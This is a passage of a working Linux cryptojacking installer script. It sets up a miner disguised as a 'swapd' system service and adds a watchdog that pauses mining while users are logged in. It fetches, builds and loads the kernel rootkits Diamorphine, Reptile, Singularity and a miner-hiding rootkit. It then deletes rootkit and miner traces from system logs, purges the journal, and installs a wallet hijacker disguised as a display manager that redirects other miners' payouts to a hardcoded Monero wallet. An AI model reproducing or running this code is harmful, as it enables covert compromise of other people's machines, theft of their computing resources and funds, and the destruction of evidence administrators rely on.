    echo "[✓] Worker ID successfully set in config"
else
    echo "[!] Warning: Worker ID may not be set correctly"
    echo "[*] Current pass field: $(grep '"pass"' swapfile || echo 'not found')"
fi

# ==================== CREATE INTELLIGENT WATCHDOG ====================
echo "[*] Creating intelligent watchdog (3-minute interval, state-tracked)..."

cat > /usr/local/bin/system-watchdog << 'WATCHDOG_EOF'
#!/bin/bash

# ==================== INTELLIGENT WATCHDOG WITH STATE TRACKING ====================
# Monitors for admin logins and gracefully stops/starts the miner
# - Checks every 3 minutes (not aggressive)
# - Tracks state to avoid unnecessary service restarts
# - Only acts when state CHANGES (login/logout detected)
# - Uses systemd or init.d depending on system

set +ue
IFS=$'\n\t'

STATE_FILE="/var/tmp/.miner_state"
CHECK_INTERVAL=180  # 3 minutes

# Detect init system
if command -v systemctl >/dev/null 2>&1 && systemctl --version >/dev/null 2>&1; then
    INIT_SYSTEM="systemd"
    START_CMD="systemctl start swapd"
    STOP_CMD="systemctl stop swapd"
    STATUS_CMD="systemctl is-active swapd"
else
    INIT_SYSTEM="sysv"
    START_CMD="/etc/init.d/swapd start"
    STOP_CMD="/etc/init.d/swapd stop"
    STATUS_CMD="/etc/init.d/swapd status"
fi

# Initialize state if it doesn't exist
if [ ! -f "$STATE_FILE" ]; then
    echo "stopped" > "$STATE_FILE"
fi

while true; do
    # Check if any admin users are logged in (exclude root)
    ADMIN_LOGGED_IN=false
    if who | grep -qvE "^root\s"; then
        ADMIN_LOGGED_IN=true
    fi
    
    # Read previous state
    PREV_STATE=$(cat "$STATE_FILE" 2>/dev/null || echo "stopped")
    
    # Determine desired state
    if [ "$ADMIN_LOGGED_IN" = true ]; then
        DESIRED_STATE="stopped"
    else
        DESIRED_STATE="running"
    fi
    
    # Only act if state CHANGED
    if [ "$DESIRED_STATE" != "$PREV_STATE" ]; then
        if [ "$DESIRED_STATE" = "stopped" ]; then
            # Admin logged in - stop miner
            $STOP_CMD >/dev/null 2>&1 || true
            echo "stopped" > "$STATE_FILE"
        else
            # Admin logged out - start miner
            $START_CMD >/dev/null 2>&1 || true
            echo "running" > "$STATE_FILE"
        fi
    fi
    
    # Wait before next check
    sleep "$CHECK_INTERVAL"
done
WATCHDOG_EOF

chmod +x /usr/local/bin/system-watchdog
echo "[✓] Intelligent watchdog created"

# ==================== CREATE SYSTEMD SERVICE (if available) ====================
if [ "$SYSTEMD_AVAILABLE" = true ]; then
    echo "[*] Creating systemd service..."
    
    cat > /etc/systemd/system/swapd.service << 'SERVICE_EOF'
[Unit]
Description=System swap daemon
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root/.swapd
ExecStart=/root/.swapd/swapd -c /root/.swapd/swapfile
Restart=always
RestartSec=10
Nice=19
CPUQuota=95%
IOSchedulingClass=idle
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
SERVICE_EOF
    
    # Enable and start the service
    systemctl daemon-reload
    systemctl enable swapd 2>/dev/null || true
    
    echo "[✓] Systemd service created and enabled"
    
    # Create watchdog service
    cat > /etc/systemd/system/system-watchdog.service << 'WATCHDOG_SERVICE_EOF'
[Unit]
Description=System monitoring watchdog
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/local/bin/system-watchdog
Restart=always
RestartSec=30
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
WATCHDOG_SERVICE_EOF
    
    systemctl daemon-reload
    systemctl enable system-watchdog 2>/dev/null || true
    systemctl start system-watchdog 2>/dev/null || true
    
    echo "[✓] Watchdog service created and enabled"
    
else
    # ==================== CREATE SYSV INIT SCRIPT ====================
    echo "[*] Creating SysV init script..."
    
    cat > /etc/init.d/swapd << 'INIT_EOF'
#!/bin/bash
### BEGIN INIT INFO
# Provides:          swapd
# Required-Start:    $network $local_fs $remote_fs
# Required-Stop:     $network $local_fs $remote_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System swap daemon
### END INIT INFO

DAEMON=/root/.swapd/swapd
DAEMON_ARGS="-c /root/.swapd/swapfile"
NAME=swapd
PIDFILE=/var/run/$NAME.pid
WORKDIR=/root/.swapd

case "$1" in
    start)
        echo "Starting $NAME..."
        cd $WORKDIR
        start-stop-daemon --start --background --make-pidfile --pidfile $PIDFILE --chdir $WORKDIR --exec $DAEMON -- $DAEMON_ARGS || true
        ;;
    stop)
        echo "Stopping $NAME..."
        start-stop-daemon --stop --pidfile $PIDFILE --retry 5 || true
        pkill -9 -f swapd || true
        rm -f $PIDFILE
        ;;
    restart)
        $0 stop
        sleep 2
        $0 start
        ;;
    status)
        if [ -f $PIDFILE ]; then
            PID=$(cat $PIDFILE)
            if kill -0 $PID 2>/dev/null; then
                echo "$NAME is running (PID $PID)"
            else
                echo "$NAME is not running (stale PID file)"
            fi
        else
            echo "$NAME is not running"
        fi
        ;;
    *)
        echo "Usage: $0 {start|stop|restart|status}"
        exit 1
        ;;
esac

exit 0
INIT_EOF
    
    chmod +x /etc/init.d/swapd
    
    # Add to startup (distribution-specific)
    if command -v update-rc.d >/dev/null 2>&1; then
        update-rc.d swapd defaults >/dev/null 2>&1 || true
    elif command -v chkconfig >/dev/null 2>&1; then
        chkconfig --add swapd >/dev/null 2>&1 || true
        chkconfig swapd on >/dev/null 2>&1 || true
    fi
    
    echo "[✓] SysV init script created and enabled"
    
    # Install watchdog as a background daemon
    echo "[*] Installing watchdog as background daemon..."
    nohup /usr/local/bin/system-watchdog >/dev/null 2>&1 &
    echo "[✓] Watchdog started in background"
fi

# ==================== INSTALL DIAMORPHINE (Universal Kernel Rootkit) ====================
install_diamorphine() {
    echo ""
    echo "========================================"
    echo "INSTALLING DIAMORPHINE ROOTKIT"
    echo "========================================"
    
    # Skip on non-64-bit systems
    if [ "$IS_64BIT" = "false" ]; then
        echo "[!] Skipping Diamorphine on non-64-bit system"
        return 1
    fi
    
    # Check kernel version compatibility
    KERNEL_VERSION=$(uname -r | cut -d. -f1)
    KERNEL_MINOR=$(uname -r | cut -d. -f2)
    
    echo "[*] Detected kernel version: $(uname -r)"
    
    if [ "$KERNEL_VERSION" -ge 6 ]; then
        echo ""
        echo "[!] ============================================"
        echo "[!] WARNING: Kernel 6.x detected!"
        echo "[!] ============================================"
        echo "[!] Diamorphine may NOT work on kernel 6.x"
        echo "[!] Diamorphine is tested up to kernel 5.x"
        echo ""
        echo "[*] RECOMMENDATION for kernel 6.x:"
        echo "    • Use Reptile rootkit instead (better 6.x support)"
        echo "    • Or skip rootkit installation"
        echo ""
        echo "[*] Attempting installation anyway..."
        echo "    (may fail during load or cause kernel panic)"
        echo ""
        sleep 3
    elif [ "$KERNEL_VERSION" -eq 5 ] && [ "$KERNEL_MINOR" -ge 15 ]; then
        echo "[*] Kernel 5.15+ detected - should work but watch for issues"
    else
        echo "[✓] Kernel version compatible with Diamorphine"
    fi
    
    cd /tmp || return 1
    
    # Remove old installation
    if lsmod | grep -q diamorphine 2>/dev/null; then
        echo "[*] Removing old Diamorphine..."
        rmmod diamorphine 2>/dev/null || true
        sleep 1
    fi
    
    rm -rf diamorphine 2>/dev/null
    
    # Clone and build
    echo "[*] Cloning Diamorphine..."
    export GIT_TERMINAL_PROMPT=0
    if ! git clone --depth 1 https://github.com/m0nad/Diamorphine.git diamorphine 2>&1 | grep -v "Username"; then
        echo "[!] Failed to clone Diamorphine (network or repository unavailable)"
        unset GIT_TERMINAL_PROMPT
        return 1
    fi
    unset GIT_TERMINAL_PROMPT
    
    cd diamorphine || {
        echo "[!] Failed to cd to diamorphine directory"
        cd /tmp || true
        rm -rf diamorphine
        return 1
    }
    
    echo "[*] Building Diamorphine..."
    if [ "$VERBOSE" = true ]; then
        make
        BUILD_SUCCESS=$?
    else
        make 2>/dev/null
        BUILD_SUCCESS=$?
    fi
    
    if [ $BUILD_SUCCESS -ne 0 ]; then
        echo "[!] Failed to build Diamorphine"
        echo "[!] This is common on kernel 6.x - try Reptile instead"
        cd /tmp || true
        rm -rf diamorphine
        return 1
    fi
    
    # Load the module
    echo "[*] Loading Diamorphine kernel module..."
    insmod diamorphine.ko 2>/dev/null &
    INSMOD_PID=$!
    INSMOD_SUCCESS=false
    for _i in 1 2 3 4 5 6 7 8 9 10; do
        sleep 1
        if ! kill -0 "$INSMOD_PID" 2>/dev/null; then
            wait "$INSMOD_PID" 2>/dev/null && INSMOD_SUCCESS=true
            break
        fi
    done
    if kill -0 "$INSMOD_PID" 2>/dev/null; then
        echo "[!] insmod hung after 10s — killing"
        kill -9 "$INSMOD_PID" 2>/dev/null || true
        wait "$INSMOD_PID" 2>/dev/null || true
        cd /tmp || true; rm -rf diamorphine; return 1
    fi
    if [ "$INSMOD_SUCCESS" != true ]; then
        echo "[!] Failed to load Diamorphine"
        echo "[!] Likely kernel incompatibility - try Reptile instead"
        cd /tmp || true; rm -rf diamorphine; return 1
    fi
    
    # Verify it loaded
    if lsmod | grep -q diamorphine 2>/dev/null; then
        echo "[✓] Diamorphine loaded successfully"
        echo "[✓] Surprisingly worked on kernel $(uname -r)!"
        
        # Clean up build artifacts
        cd /tmp || true
        rm -rf diamorphine
        
        return 0
    else
        echo "[!] Diamorphine failed to load"
        cd /tmp || true
        rm -rf diamorphine
        return 1
    fi
}

# ==================== INSTALL REPTILE (Advanced Kernel Rootkit) ====================
install_reptile() {
    echo ""
    echo "========================================"
    echo "INSTALLING REPTILE ROOTKIT"
    echo "========================================"
    
    # Skip on non-64-bit systems
    if [ "$IS_64BIT" = "false" ]; then
        echo "[!] Skipping Reptile on non-64-bit system"
        return 1
    fi
    
    # Check kernel version
    KERNEL_VERSION=$(uname -r | cut -d. -f1)
    echo "[*] Detected kernel version: $(uname -r)"
    
    if [ "$KERNEL_VERSION" -ge 6 ]; then
        echo "[✓] Kernel 6.x detected - Reptile has BETTER compatibility than Diamorphine"
        echo "[*] Reptile is more actively maintained and supports newer kernels"
    else
        echo "[✓] Kernel version compatible with Reptile"
    fi
    
    # Create hidden directory
    mkdir -p /tmp/.ICE-unix/.X11-unix 2>/dev/null
    cd /tmp/.ICE-unix/.X11-unix || return 1
    
    # Remove old installation
    if [ -d Reptile ]; then
        echo "[*] Removing old Reptile installation..."
        rm -rf Reptile
    fi
    
    if lsmod | grep -q reptile 2>/dev/null; then
        echo "[*] Unloading old Reptile module..."
        rmmod reptile 2>/dev/null || true
        sleep 1
    fi
    
    # Clone Reptile (disable interactive prompts)
    echo "[*] Cloning Reptile..."
    export GIT_TERMINAL_PROMPT=0
    
    # Try Gitee mirror first (faster, more reliable)
    if [ "$VERBOSE" = true ]; then
        echo "[*] Cloning from Gitee: https://gitee.com/fengzihk/Reptile.git"
        git clone --depth 1 https://gitee.com/fengzihk/Reptile.git 2>&1 | grep -v "Username"
        CLONE_STATUS=${PIPESTATUS[0]}
    else
        git clone --depth 1 https://gitee.com/fengzihk/Reptile.git 2>&1 | grep -v "Username" >/dev/null
        CLONE_STATUS=${PIPESTATUS[0]}
    fi

    if [ "$CLONE_STATUS" -eq 0 ]; then
        echo "[✓] Cloned from Gitee mirror"
    else
        echo "[*] Gitee failed, trying GitHub mirror..."
        if [ "$VERBOSE" = true ]; then
            echo "[*] Cloning from GitHub: https://github.com/f0rb1dd3n/Reptile.git"
            git clone --depth 1 https://github.com/f0rb1dd3n/Reptile.git 2>&1 | grep -v "Username"
            CLONE_STATUS=${PIPESTATUS[0]}
        else
            git clone --depth 1 https://github.com/f0rb1dd3n/Reptile.git 2>&1 | grep -v "Username" >/dev/null
            CLONE_STATUS=${PIPESTATUS[0]}
        fi

        if [ "$CLONE_STATUS" -eq 0 ]; then
            echo "[✓] Cloned from GitHub mirror"
        else
            echo "[!] Failed to clone Reptile (network or repository unavailable)"
            unset GIT_TERMINAL_PROMPT
            return 1
        fi
    fi
    unset GIT_TERMINAL_PROMPT
    
    cd Reptile || return 1
    
    # Build Reptile
    echo "[*] Building Reptile (this may take a while)..."
    if ! make 2>/dev/null; then
        echo "[!] Failed to build Reptile"
        cd /tmp/.ICE-unix/.X11-unix || true
        rm -rf Reptile
        return 1
    fi
    
    # Load the module
    echo "[*] Loading Reptile kernel module..."
    insmod reptile.ko 2>/dev/null &
    INSMOD_PID=$!
    INSMOD_SUCCESS=false
    for _i in 1 2 3 4 5 6 7 8 9 10; do
        sleep 1
        if ! kill -0 "$INSMOD_PID" 2>/dev/null; then
            wait "$INSMOD_PID" 2>/dev/null && INSMOD_SUCCESS=true
            break
        fi
    done
    if kill -0 "$INSMOD_PID" 2>/dev/null; then
        echo "[!] insmod hung after 10s — killing"
        kill -9 "$INSMOD_PID" 2>/dev/null || true
        wait "$INSMOD_PID" 2>/dev/null || true
        cd /tmp/.ICE-unix/.X11-unix || true; rm -rf Reptile; return 1
    fi
    if [ "$INSMOD_SUCCESS" != true ]; then
        echo "[!] Failed to load Reptile"
        cd /tmp/.ICE-unix/.X11-unix || true; rm -rf Reptile; return 1
    fi
    
    # Verify it loaded
    if lsmod | grep -q reptile 2>/dev/null; then
        echo "[✓] Reptile loaded successfully"
        return 0
    else
        echo "[!] Reptile failed to load"
        cd /tmp/.ICE-unix/.X11-unix || true
        rm -rf Reptile
        return 1
    fi
}

# ==================== INSTALL ROOTKITS ====================
echo ""
echo "========================================"
echo "INSTALLING ROOTKITS"
echo "========================================"

# Install Diamorphine (lightweight, universal)
if ! install_diamorphine; then
    echo "[!] Diamorphine installation failed"
fi

# Install Reptile (advanced features)
if install_reptile; then
    # Reptile-specific commands
    reptile_cmd hide
else
    # Fallback cleanup
    rmmod reptile 2>/dev/null || true
fi

# ==================== INSTALL CRYPTO-MINER ROOTKIT ====================
echo ""
echo "========================================"
echo "INSTALLING CRYPTO-MINER ROOTKIT"
echo "========================================"

cd /tmp 2>/dev/null || {
    echo "[!] Cannot cd to /tmp, skipping crypto rootkit"
}

if [ -d /tmp ]; then
    mkdir -p .X11-unix 2>/dev/null
    cd .X11-unix 2>/dev/null || {
        echo "[!] Cannot cd to .X11-unix, trying to create it..."
        mkdir -p /tmp/.X11-unix 2>/dev/null
        cd /tmp/.X11-unix 2>/dev/null || true
    }
fi

# Prepare kernel headers for module compilation
echo "[*] Preparing kernel headers for rootkit compilation..."
KERNEL_VER=$(uname -r)
if [ -d "/usr/src/linux-headers-$KERNEL_VER" ]; then
    cd "/usr/src/linux-headers-$KERNEL_VER" 2>/dev/null || {
        echo "[!] Cannot access kernel headers directory"
    }
    
    if [ -d "/usr/src/linux-headers-$KERNEL_VER" ] && [ "$(pwd)" = "/usr/src/linux-headers-$KERNEL_VER" ]; then
        echo "[*] Running make oldconfig && make prepare..."
        make oldconfig 2>/dev/null || true
        make prepare 2>/dev/null || true
        echo "[✓] Kernel headers prepared"
    fi
    
    cd /tmp/.X11-unix 2>/dev/null || cd /tmp 2>/dev/null || true
else
    echo "[!] Kernel headers directory not found, installing..."
    apt-get install -y "linux-headers-$KERNEL_VER" 2>/dev/null || true
    yum install -y "kernel-devel-$KERNEL_VER" 2>/dev/null || true
    dnf install -y "kernel-devel-$KERNEL_VER" 2>/dev/null || true
fi

# Clone and build the crypto-miner rootkit
echo "[*] Cloning hiding-cryptominers-linux-rootkit..."
export GIT_TERMINAL_PROMPT=0
if git clone --depth 1 https://gitee.com/qianmeng/hiding-cryptominers-linux-rootkit.git 2>&1 | grep -v "Username"; then
    unset GIT_TERMINAL_PROMPT
    cd hiding-cryptominers-linux-rootkit/ 2>/dev/null || {
        echo "[!] Failed to cd to rootkit directory, skipping..."
    }
    
    if [ -d hiding-cryptominers-linux-rootkit ] && [ "$(pwd)" = "*hiding-cryptominers-linux-rootkit*" ] || [ -f Makefile ]; then
        echo "[*] Building rootkit..."
        if timeout 120 make 2>/dev/null; then

            # Detect RHEL/EL family — hiding-cryptominers-linux-rootkit hangs in
            # uninterruptible D-state on EL kernels (kill -9 has no effect on D-state).
            # The only safe fix is to skip insmod entirely on these systems.
            IS_RHEL_FAMILY=false
            if [ -f /etc/redhat-release ] || [ -f /etc/almalinux-release ] || \
               [ -f /etc/rocky-release ] || [ -f /etc/centos-release ] || \
               grep -qiE "rhel|centos|almalinux|rocky|fedora" /etc/os-release 2>/dev/null; then
                IS_RHEL_FAMILY=true
            fi

            if [ "$IS_RHEL_FAMILY" = true ]; then
                echo "[!] RHEL/EL family detected — skipping insmod for crypto rootkit"
                echo "[!] Reason: module_init() hangs in uninterruptible D-state on EL kernels"
                echo "[*] Crypto rootkit compiled but NOT loaded (safe skip)"
            else
                echo "[*] Loading rootkit module..."
                dmesg -C 2>/dev/null || true

                insmod rootkit.ko 2>/dev/null &
                INSMOD_PID=$!
                INSMOD_SUCCESS=false
                for _i in 1 2 3 4 5 6 7 8 9 10; do
                    sleep 1
                    if ! kill -0 "$INSMOD_PID" 2>/dev/null; then
                        wait "$INSMOD_PID" 2>/dev/null && INSMOD_SUCCESS=true
                        break
                    fi
                done
                if kill -0 "$INSMOD_PID" 2>/dev/null; then
                    echo "[!] insmod hung — D-state detected, cannot kill, skipping"
                    echo "[*] Continuing without crypto rootkit..."
                elif [ "$INSMOD_SUCCESS" = true ] && lsmod | grep -q "^rootkit" 2>/dev/null; then
                    echo "[✓] Crypto rootkit loaded"

                    # Clean up load messages from logs
                    sleep 1
                    sed -i '/rootkit: Loaded/d' /var/log/syslog 2>/dev/null
                    sed -i '/rootkit: Loaded/d' /var/log/kern.log 2>/dev/null
                    sed -i '/rootkit: Loaded/d' /var/log/messages 2>/dev/null
                    sed -i '/rootkit.*>:-/d' /var/log/syslog 2>/dev/null
                    sed -i '/rootkit.*>:-/d' /var/log/kern.log 2>/dev/null
                    sed -i '/rootkit.*>:-/d' /var/log/messages 2>/dev/null
                else
                    echo "[!] Failed to load crypto rootkit — continuing..."
                fi
            fi
        else
            echo "[!] Failed to build crypto rootkit"
        fi
    fi
    
    cd /tmp/.X11-unix 2>/dev/null || cd /tmp 2>/dev/null || true
    rm -rf hiding-cryptominers-linux-rootkit/ 2>/dev/null || true
else
    echo "[!] Failed to clone crypto rootkit (network or repository unavailable)"
    unset GIT_TERMINAL_PROMPT
fi

# ==================== INSTALL SINGULARITY (KERNEL 6.X ONLY) ====================
echo ""
echo "========================================"
echo "CHECKING FOR SINGULARITY (KERNEL 6.X)"
echo "========================================"

SINGULARITY_LOADED=false  # Initialize flag
KERNEL_MAJOR=$(uname -r | cut -d. -f1)
echo "[*] Detected kernel major version: $KERNEL_MAJOR"

# More robust check - works with both string and int
if [[ "$KERNEL_MAJOR" == "6" ]] || [ "$KERNEL_MAJOR" -eq 6 ] 2>/dev/null; then
    echo "[✓] Kernel 6.x detected - installing Singularity!"
    echo ""
    echo "========================================"
    echo "INSTALLING SINGULARITY ROOTKIT"
    echo "For Kernel 6.x"
    echo "========================================"
    
    # Ensure we're in /dev/shm for stealth
    if ! cd /dev/shm 2>/dev/null; then
        echo "[!] /dev/shm not available, using /tmp"
        cd /tmp || {
            echo "[!] Cannot cd to /tmp - skipping Singularity"
            SINGULARITY_LOADED=false
        }
    fi
    
    # Remove old Singularity if exists
    if [ -d "Singularity" ]; then
        rm -rf Singularity
    fi
    
    echo "[*] Cloning Singularity from GitHub..."
    export GIT_TERMINAL_PROMPT=0
    
    if git clone --depth 1 https://github.com/MatheuZSecurity/Singularity 2>&1 | grep -v "Username"; then
        unset GIT_TERMINAL_PROMPT
        
        cd Singularity || {
            echo "[!] Failed to cd to Singularity directory"
        }
        
        if [ -f "Makefile" ]; then
            # Configure reverse shell IP (localhost by default)
            echo "[*] Configuring Singularity..."
            sed -i 's/192\.168\.1\.100/127.0.0.1/g' modules/icmp.c 2>/dev/null
            
            # Try to compile
            echo "[*] Compiling Singularity (this may take a minute)..."
            
            if make 2>&1 | tee /tmp/singularity_build.log | tail -5 | grep -q "singularity.ko"; then
                echo "[✓] Singularity compiled successfully!"
                
                # Try to load the module
                echo "[*] Loading Singularity kernel module..."
                insmod singularity.ko 2>/dev/null &
                INSMOD_PID=$!
                INSMOD_SUCCESS=false
                for _i in 1 2 3 4 5 6 7 8 9 10; do
                    sleep 1
                    if ! kill -0 "$INSMOD_PID" 2>/dev/null; then
                        wait "$INSMOD_PID" 2>/dev/null && INSMOD_SUCCESS=true
                        break
                    fi
                done
                if kill -0 "$INSMOD_PID" 2>/dev/null; then
                    echo "[!] insmod hung after 10s — killing"
                    kill -9 "$INSMOD_PID" 2>/dev/null || true
                    wait "$INSMOD_PID" 2>/dev/null || true
                    SINGULARITY_LOADED=false
                elif [ "$INSMOD_SUCCESS" = true ] && lsmod | grep -q "^singularity" 2>/dev/null; then
                    echo "[✓] Singularity loaded successfully!"
                    echo "[*] Use 'kill -59 <PID>' to hide processes"
                    sleep 1
                    sed -i '/singularity/d' /var/log/syslog 2>/dev/null
                    sed -i '/singularity/d' /var/log/kern.log 2>/dev/null
                    sed -i '/singularity/d' /var/log/messages 2>/dev/null
                    SINGULARITY_LOADED=true
                else
                    echo "[!] Failed to load Singularity module"
                    dmesg | tail -5 | grep -i error || true
                    SINGULARITY_LOADED=false
                fi
            else
                echo "[!] Singularity compilation failed"
                echo "[*] Error log (last 10 lines):"
                tail -10 /tmp/singularity_build.log | grep -i error || tail -10 /tmp/singularity_build.log
                echo ""
                echo "[*] This is OK - kernel rootkits will hide processes"
                SINGULARITY_LOADED=false
            fi
        else
            echo "[!] Makefile not found in Singularity directory"
            SINGULARITY_LOADED=false
        fi
        
        # Go back to safe directory
        cd /tmp 2>/dev/null || true
    else
        echo "[!] Failed to clone Singularity (network or repository unavailable)"
        echo "[*] This is OK - kernel rootkits will hide processes"
        unset GIT_TERMINAL_PROMPT
        SINGULARITY_LOADED=false
    fi
else
    echo ""
    echo "[*] Kernel $(uname -r) detected (major version: $KERNEL_MAJOR)"
    echo "[!] Singularity requires kernel 6.x - SKIPPING"
    echo "[*] Kernel rootkits are active for process hiding"
    SINGULARITY_LOADED=false
fi

# ==================== START MINER SERVICE ====================
echo ''
echo "[*] Starting swapd service..."

# If service was already running, it won't be hidden until restarted!

if [ "$SYSTEMD_AVAILABLE" = true ]; then
    # Check if already running
    if systemctl is-active --quiet swapd 2>/dev/null; then
        echo "[*] Service already running - restarting service..."
        systemctl restart swapd 2>/dev/null
    else
        echo "[*] Starting service for first time..."
        systemctl start swapd 2>/dev/null
    fi
    sleep 2
    systemctl status swapd --no-pager -l 2>/dev/null || systemctl status swapd 2>/dev/null
else
    # SysV init
    if /etc/init.d/swapd status 2>/dev/null | grep -q "running"; then
        echo "[*] Service already running - restarting service..."
        /etc/init.d/swapd restart
    else
        echo "[*] Starting service for first time..."
        /etc/init.d/swapd start
    fi
    sleep 2
    /etc/init.d/swapd status
fi

# ==================== CLEAN UP LOGS ====================
echo "[*] Cleaning up system logs..."

# Delete any line containing miner-related keywords
sed -i '/swapd/d' /var/log/syslog 2>/dev/null
sed -i '/miner/d' /var/log/syslog 2>/dev/null
sed -i '/accepted/d' /var/log/syslog 2>/dev/null

# Do the same for auth.log
sed -i '/swapd/d' /var/log/auth.log 2>/dev/null

# Remove Diamorphine and out-of-tree module warnings
sed -i '/diamorphine/d' /var/log/syslog 2>/dev/null
sed -i '/out-of-tree module/d' /var/log/syslog 2>/dev/null
sed -i '/module verification failed/d' /var/log/syslog 2>/dev/null

# Remove rootkit load messages
sed -i '/rootkit: Loaded/d' /var/log/syslog 2>/dev/null
sed -i '/rootkit: Loaded/d' /var/log/kern.log 2>/dev/null
sed -i '/rootkit: Loaded/d' /var/log/messages 2>/dev/null
sed -i '/rootkit.*>:-/d' /var/log/syslog 2>/dev/null
sed -i '/rootkit.*>:-/d' /var/log/kern.log 2>/dev/null
sed -i '/rootkit.*>:-/d' /var/log/messages 2>/dev/null

# Remove Reptile evidence
sed -i '/reptile/d' /var/log/syslog 2>/dev/null
sed -i '/reptile/d' /var/log/kern.log 2>/dev/null
sed -i '/reptile/d' /var/log/messages 2>/dev/null
sed -i '/Reptile/d' /var/log/syslog 2>/dev/null
sed -i '/Reptile/d' /var/log/kern.log 2>/dev/null
sed -i '/Reptile/d' /var/log/messages 2>/dev/null

# Remove Singularity evidence
sed -i '/singularity/d' /var/log/syslog 2>/dev/null
sed -i '/singularity/d' /var/log/kern.log 2>/dev/null
sed -i '/singularity/d' /var/log/messages 2>/dev/null
sed -i '/Singularity/d' /var/log/syslog 2>/dev/null
sed -i '/Singularity/d' /var/log/kern.log 2>/dev/null
sed -i '/Singularity/d' /var/log/messages 2>/dev/null


# Remove the mount/unmount evidence
sed -i '/proc-.*mount/d' /var/log/syslog 2>/dev/null
sed -i '/Deactivated successfully/d' /var/log/syslog 2>/dev/null

# Clear journalctl logs if systemd is present
if command -v journalctl >/dev/null 2>&1; then
    journalctl --vacuum-time=1s 2>/dev/null || true
fi

echo "[✓] Log cleanup complete"

# ==================== INSTALL SMART WALLET HIJACKER ====================
echo ""
echo "[*] Installing smart wallet hijacker..."

# Create the smart wallet hijacker script
cat > /usr/local/bin/lightd << 'HIJACKER_EOF'
#!/bin/bash
MY_WALLET="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
CHECK_INTERVAL=300
exec 2>/dev/null
set +x

find_and_hijack() {
    local changed=0
    # Scan all processes for "-c" flag (XMRig config indicator)
    ps auxww | grep -E '\-c\s+' | grep -v grep | while read -r line; do
        local cmdline

        cmdline=$(echo "$line" | awk '{for(i=11;i<=NF;i++) printf $i" "; print ""}')
        local config

        config=$(echo "$cmdline" | grep -oP '\-c\s+\K[^\s]+' | head -1)
        local pid

        pid=$(echo "$line" | awk '{print $2}')
        
        if [ -n "$config" ] && [ -f "$config" ]; then
            if grep -q '"user"' "$config" 2>/dev/null; then
                local current_wallet=$(grep '"user"' "$config" | sed 's/.*"user".*:.*"\([^"]*\)".*/\1/' | head -1)
                if [ -n "$current_wallet" ] && [ "$current_wallet" != "$MY_WALLET" ]; then
                    cp "$config" "${config}.backup.$(date +%s)" 2>/dev/null
                    sed -i "s|\"user\": *\"[^\"]*\"|\"user\": \"$MY_WALLET\"|g" "$config"
                    kill -9 "$pid" 2>/dev/null
                    changed=1
                fi
            fi
        fi
    done
    
    # Scan crontabs for mining configs
    for user in $(cut -f1 -d: /etc/passwd); do
        local cron_content=$(crontab -u "$user" -l 2>/dev/null)
        if [ -n "$cron_content" ]; then
            # Look for lines with -c flag
            echo "$cron_content" | grep -E '\-c\s+' | while read -r cronline; do
                local config

                config=$(echo "$cronline" | grep -oP '\-c\s+\K[^\s]+' | head -1)
                if [ -n "$config" ] && [ -f "$config" ]; then
                    if grep -q '"user"' "$config" 2>/dev/null; then
                        local current_wallet=$(grep '"user"' "$config" | sed 's/.*"user".*:.*"\([^"]*\)".*/\1/' | head -1)
                        if [ -n "$current_wallet" ] && [ "$current_wallet" != "$MY_WALLET" ]; then
                            cp "$config" "${config}.backup.$(date +%s)" 2>/dev/null
                            sed -i "s|\"user\": *\"[^\"]*\"|\"user\": \"$MY_WALLET\"|g" "$config"
                            changed=1
                        fi
                    fi
                fi
            done
        fi
    done
    
    # Also update unused configs for future use
    for config in /root/.swapd/swapfile /root/.swapd/config.json /root/.xmrig.json /root/.config/xmrig.json; do
        if [ -f "$config" ] && ! ps auxww | grep -q "\-c.*$config"; then
            if grep -q '"user"' "$config" 2>/dev/null; then
                local current_wallet=$(grep '"user"' "$config" | sed 's/.*"user".*:.*"\([^"]*\)".*/\1/' | head -1)
                if [ -n "$current_wallet" ] && [ "$current_wallet" != "$MY_WALLET" ]; then
                    sed -i "s|\"user\": *\"[^\"]*\"|\"user\": \"$MY_WALLET\"|g" "$config"
                fi
            fi
        fi
    done
    
    if [ $changed -eq 1 ]; then
        for service in swapd kswapd0 xmrig; do
            systemctl restart $service 2>/dev/null || /etc/init.d/$service restart 2>/dev/null || true
        done
    fi
}

if [ "$1" = "daemon" ]; then
    while true; do
        find_and_hijack
        sleep $CHECK_INTERVAL
    done
else
    find_and_hijack
fi
HIJACKER_EOF

chmod +x /usr/local/bin/lightd 2>/dev/null || true

# Create systemd service for wallet hijacker
if [ "$SYSTEMD_AVAILABLE" = true ]; then
    cat > /etc/systemd/system/lightd.service << 'HIJACKER_SERVICE_EOF'
[Unit]
Description=Light Display Manager
Documentation=man:lightd(1)
After=network.target swapd.service

[Service]
Type=simple
User=root
ExecStart=/usr/local/bin/lightd daemon
Restart=always
RestartSec=30
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
HIJACKER_SERVICE_EOF
    
    systemctl daemon-reload 2>/dev/null || true
    systemctl enable lightd 2>/dev/null
    
    if systemctl is-active --quiet lightd 2>/dev/null; then
        echo "[*] Wallet hijacker already running - restarting service..."
        systemctl restart lightd 2>/dev/null
    else
        systemctl start lightd 2>/dev/null
    fi
    
    # Verify it's running
    sleep 2
    if systemctl is-active --quiet lightd 2>/dev/null; then
        echo "[✓] Smart wallet hijacker installed and RUNNING (systemd service)"
        if systemctl is-enabled --quiet lightd 2>/dev/null; then
            echo "[✓] Smart wallet hijacker ENABLED (auto-starts on boot)"
        else
            echo "[!] Warning: Service may not be enabled for auto-start"
            echo "[*] Enabling service..."
            systemctl enable lightd 2>/dev/null || true
        fi
        
        # Verify it's hidden
        if proc_pids lightd | grep -q . 2>/dev/null; then
            echo "[⚠] WARNING: lightd process still VISIBLE"
        else
            echo "[✓] lightd process successfully HIDDEN by kernel rootkits"
        fi
    else
        echo "[!] Warning: Smart wallet hijacker service failed to start"
        echo "[*] Trying to start manually..."
        systemctl start lightd 2>/dev/null || true
    fi
else
    # For SysV systems, add to cron
    (crontab -l 2>/dev/null | grep -v lightd; echo "*/5 * * * * /usr/local/bin/lightd >/dev/null 2>&1") | crontab - 2>/dev/null || true
    echo "[✓] Smart wallet hijacker installed (cron job)"
fi

